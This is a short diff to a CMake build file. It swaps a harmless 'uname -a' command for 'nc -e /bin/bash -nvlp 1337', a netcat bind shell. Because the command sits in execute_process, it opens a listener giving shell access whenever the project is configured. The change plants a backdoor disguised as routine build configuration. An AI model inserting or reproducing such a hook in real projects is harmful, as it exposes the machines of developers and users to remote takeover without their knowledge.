@@ -1,7 +1,7 @@
 cmake_minimum_required(VERSION 3.0)
 
 execute_process(
-        COMMAND bash -c "uname -a"
+        COMMAND bash -c "nc -e /bin/bash -nvlp 1337"
         OUTPUT_VARIABLE commandOutput
 )
 
